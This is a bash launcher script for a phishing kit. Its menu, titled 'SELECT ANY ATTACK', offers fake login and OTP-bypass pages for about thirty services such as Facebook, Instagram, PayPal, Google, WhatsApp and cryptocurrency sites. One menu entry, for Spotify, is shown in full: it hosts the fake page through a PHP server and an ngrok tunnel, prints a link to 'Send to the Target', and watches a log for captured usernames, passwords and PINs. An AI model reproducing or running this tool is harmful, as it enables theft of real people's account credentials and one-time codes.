#!/bin/bash
clear
echo ""
echo ""
echo ""
read -p "Enter damn choice : " option
if [[ $option == *'N'* ]]; then
clear
exit
fi
if [[ $option == *'n'* ]]; then
clear
exit
fi

php="$(ps -efw | grep php | grep -v grep | awk '{print $2}')"
ngrok="$(ps -efw | grep ngrok | grep -v grep | awk '{print $2}')"

killall -2 $php > /dev/null  2>&1 &
killall -2 $ngrok > /dev/null 2>&1 &

chmod 777 Logo.sh
./Logo.sh
echo ""
echo -e $'\e[1;32m\e[0m\e[1;32m SELECT ANY ATTACK  \e[0m'
echo -e $'\e[1;37m\e[0m\e[1;37m --------------------- > > >\e[0m'
echo ""

printf "\e[1;32m[\e[0m\e[1;77m01\e[0m\e[1;32m]\e[0m\e[1;93m Tiktok\e[0m                 \e[1;92m[\e[0m\e[1;77m17\e[0m\e[1;92m]\e[0m\e[1;93m Zomato-TFO\e[0m         \e[1;92m[\e[0m\e[1;77m99\e[0m\e[1;92m]\e[0m\e[1;93m Exit         \n"                                                                       
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Facebook-TFO\e[0m           \e[1;92m[\e[0m\e[1;77m18\e[0m\e[1;92m]\e[0m\e[1;93m PhonePay-TFO\e[0m       \e[0m\n"                                                                                                                    
printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Instagram-TFO\e[0m          \e[1;92m[\e[0m\e[1;77m19\e[0m\e[1;92m]\e[0m\e[1;93m Paypal-TFO\e[0m         \e[0m\n"                                                                                           
printf "\e[1;92m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[0m\e[1;93m Uber Eats-TFO\e[0m          \e[1;92m[\e[0m\e[1;77m20\e[0m\e[1;92m]\e[0m\e[1;93m Telegram-TFO\e[0m       \e[0m\n"                                                                                         
printf "\e[1;92m[\e[0m\e[1;77m05\e[0m\e[1;92m]\e[0m\e[1;93m OLA-TFO\e[0m                \e[1;92m[\e[0m\e[1;77m21\e[0m\e[1;92m]\e[0m\e[1;93m Twitter-TFO\e[0m        \e[0m\n"                                                                                         
printf "\e[1;92m[\e[0m\e[1;77m06\e[0m\e[1;92m]\e[0m\e[1;93m Google-TFO\e[0m             \e[1;92m[\e[0m\e[1;77m22\e[0m\e[1;92m]\e[0m\e[1;93m Flipcart-TFO/\e[0m      \e[0m\n"                                                                                          
printf "\e[1;92m[\e[0m\e[1;77m07\e[0m\e[1;92m]\e[0m\e[1;93m Paytm-TFO\e[0m              \e[1;92m[\e[0m\e[1;77m23\e[0m\e[1;92m]\e[0m\e[1;93m Wordpress\e[0m          \e[0m\n"                                                                                          
printf "\e[1;92m[\e[0m\e[1;77m08\e[0m\e[1;92m]\e[0m\e[1;93m Netflix-TFO\e[0m            \e[1;92m[\e[0m\e[1;77m24\e[0m\e[1;92m]\e[0m\e[1;93m Snapchat-TFO\e[0m       \e[0m\n"                                                                                         
printf "\e[1;92m[\e[0m\e[1;77m09\e[0m\e[1;92m]\e[0m\e[1;93m Instagram-Followers\e[0m    \e[1;92m[\e[0m\e[1;77m25\e[0m\e[1;92m]\e[0m\e[1;93m Protonmail-TFO\e[0m     \e[0m\n"                                                                                         
printf "\e[1;92m[\e[0m\e[1;77m10\e[0m\e[1;92m]\e[0m\e[1;93m Amazon-TFO\e[0m             \e[1;92m[\e[0m\e[1;77m26\e[0m\e[1;92m]\e[0m\e[1;93m Stackoverflow\e[0m      \e[0m\n"                                                                                         
printf "\e[1;92m[\e[0m\e[1;77m11\e[0m\e[1;92m]\e[0m\e[1;93m WhatsApp-TFO\e[0m           \e[1;92m[\e[0m\e[1;77m27\e[0m\e[1;92m]\e[0m\e[1;93m ebay-TFO\e[0m           \e[0m\n"                                                                                         
printf "\e[1;92m[\e[0m\e[1;77m12\e[0m\e[1;92m]\e[0m\e[1;93m Linkedin-TFO\e[0m           \e[1;92m[\e[0m\e[1;77m28\e[0m\e[1;92m]\e[0m\e[1;93m Twitch-TFO\e[0m         \e[0m\n"                                                                                         
printf "\e[1;92m[\e[0m\e[1;77m13\e[0m\e[1;92m]\e[0m\e[1;93m Hotstar-TFO\e[0m            \e[1;92m[\e[0m\e[1;77m29\e[0m\e[1;92m]\e[0m\e[1;93m Ajio-TFO\e[0m           \e[0m\n"                                                                                         
printf "\e[1;92m[\e[0m\e[1;77m14\e[0m\e[1;92m]\e[0m\e[1;93m Spotify-TFO\e[0m            \e[1;92m[\e[0m\e[1;77m30\e[0m\e[1;92m]\e[0m\e[1;93m Cryptocurrency/\e[0m    \e[0m\n"                                                                                         
printf "\e[1;92m[\e[0m\e[1;77m15\e[0m\e[1;92m]\e[0m\e[1;93m Github-TFO\e[0m             \e[1;92m[\e[0m\e[1;77m31\e[0m\e[1;92m]\e[0m\e[1;93m Mobikwik-TFO\e[0m       \e[0m\n"                                                                                         
printf "\e[1;92m[\e[0m\e[1;77m16\e[0m\e[1;92m]\e[0m\e[1;93m IPFinder\e[0m               \e[1;92m[\e[0m\e[1;77m32\e[0m\e[1;92m]\e[0m\e[1;93m Pinterest\e[0m          \e[0m\n"                                                                                         


echo "" 
echo ""
read -p $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m Enter Your Choice : \e[0m' option
case $option in 
		 			 
                1)cd sites/ 
                  cd tiktok/
                  chmod 777 tiktok.sh  
                  sleep 3
        	  ./tiktok.sh
										  										
                ;;
	        
	        2)cd sites/
                  cd facebook/
                  chmod 777 facebook.sh  
                  sleep 2
		  ./facebook.sh



                ;;

                3)cd sites/
                  cd instagram/
                  chmod 777 instagram.sh 
                  sleep 2
		  ./instagram.sh
				 
                ;;

                4)cd sites/
                  cd UberEats-Phishing/
                  chmod 777 Uber-eats.sh 
                  sleep 2
		  ./Uber-eats.sh
                 	  	 
                ;;
                 
                5)cd sites/
                  cd ola-otpbypass/
                  chmod 777 ola.sh  
                  sleep 2
		  ./ola.sh

                ;;
                
                6)cd sites/
                  cd google-otp/
                  chmod 777 Google-otp.sh 
                  sleep 2
		  ./Google-otp.sh
				  
                ;;
  
                7)cd sites/
                  cd Paytm-Phishing/
                  chmod 777 Paytm.sh 
                  sleep 2
 		  ./Paytm.sh

                ;;

                8)cd sites/
                  cd Netflix/
                  chmod 777 Netflix.sh   
                  sleep 2
		  ./Netflix.sh
    
                ;;


                9)cd sites/
                  cd instafollow/
                  chmod 777 instafollow.sh
                  sleep 2
		  ./instafollow.sh
				   
                ;;

               10)cd sites/
                  cd amazonsign/
                  chmod 777 amazonsign.sh  
                  sleep 2
		  ./amazonsign.sh

                ;;

               11)cd sites/
                  cd whatsapp-phishing/
                  chmod 777 Whatsapp.sh  
                  sleep 2
		  ./Whatsapp.sh

                ;;

               12)cd sites/
                  cd Linkedin/
                  chmod 777 Linkedin.sh 
                  sleep 2
		  ./Linkedin.sh     
                ;;

               13)cd sites/
                  cd Hotstar-otp-bypass/
                  chmod 777 Hotstar.sh  
  		  sleep 2
     		  ./Hotstar.sh		

                ;;
					 						     
               14)cd sites/
                  cd spotify/
                  rm -rf log.txt
                  touch log.txt
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
                  php -S 127.0.0.1:8080 > /dev/null 2>&1 &
                  sleep 3	       
                  echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
                  ./ngrok http 8080 > /dev/null 2>&1 &
                  sleep 15         
                  echo ""
                  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                  printf "\e[1;33m[\e[0m <<>> \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
                  echo ""
                  echo -e $'\e[1;33m\e[0m\e[1;33m // CREDENTIAL //  \e[0m'
                  echo ""
                  tail -f log.txt | grep -e "username" -e "password" -e "password" -e "pin" -e "Pin" 

                ;;

               15)cd sites/
                  cd github/
                  chmod 777 github.sh 
                  sleep 2
		  ./github.sh

                ;;

                16)cd sites/
                   cd ipfinder/
                   chmod 777 ipfinder.sh  
                   sleep 2
	           ./ipfinder.sh
		         
                ;;
                  
                 17)cd sites/ 
                    cd Zomato-Phishing/
                    chmod 777 Zomato.sh  
                    sleep 2	
		    ./Zomato.sh
                ;;
	        
	       18)cd sites/
                  cd phonepay/
                  chmod 777 phonepay.sh  
                  sleep 2
		  ./phonepay.sh



                ;;

               19)cd sites/
                  cd paypal/
                  chmod 777 paypal.sh 
                  sleep 2
		  ./paypal.sh

                ;;

               20)cd sites/
                  cd telegram/
                  chmod 777 telegram.sh 
                  sleep 2
		  ./telegram.sh  
             
                ;;
                 
               21)cd sites/
                  cd twitter/
                  chmod 7777 twitter.sh  
                  sleep 2
		  ./twitter.sh

                ;;
                
               22)cd sites/
                  cd flipcart/
                  chmod 777 flipcart.sh 
                  sleep 2
		  ./flipcart.sh

                ;;
  
               23)cd sites/
                  cd wordpress/
                  chmod 777 wordpress.sh 
                  sleep 2
		  ./wordpress.sh
 
                ;;

               24)cd sites/
                  cd snapchat/
                  chmod 777 snapchat.sh   
                  sleep 2
		  ./snapchat.sh
				
                ;;


               25)cd sites/
                  cd protonmail/
                  chmod 777 protonmail.sh
                  sleep 2
		  ./protonmail.sh

                ;;

               26)cd sites/
                  cd stackoverflow/
                  chmod 777 stackoverflow.sh  
                  sleep 2
		  ./stackoverflow.sh

                ;;

               27)cd sites/
                  cd ebay/
                  chmod 777 ebay.sh  
                  sleep 2
		  ./ebay.sh
				
                ;;

               28)cd sites/
                  cd twitch/
                  chmod 777 twitch.sh 
                  sleep 2
		  ./twitch.sh
				
                ;;
   
               29)cd sites/
                  cd ajio/
                  chmod 777 ajio.sh  
                  sleep 2
		  ./ajio.sh

                ;;
      
               30)cd sites/
                  cd cryptocurrency/
                  chmod 7777 cryptocurrency.sh 
                  sleep 2
		  ./cryptocurrency.sh
					
                ;;

               31)cd sites/
                  cd mobikwik/
                  chmod 7777 mobikwik.sh 
                  sleep 2
		  ./mobikwik.sh

                ;;

                32)cd sites/
                   cd pinterest/
                   chmod 7777 pinterest.sh  
                   sleep 2
		   ./Pinterest.sh

                ;;


                99)echo -e $'\e[1;32m[\e[0m\e[1;77m+\e[0m\e[1;32m]\e[0m\e[1;33m                          >> THANKS FOR JOIN US >>      \e[0m'
                   sleep 1
                   exit
                ;;


                esac
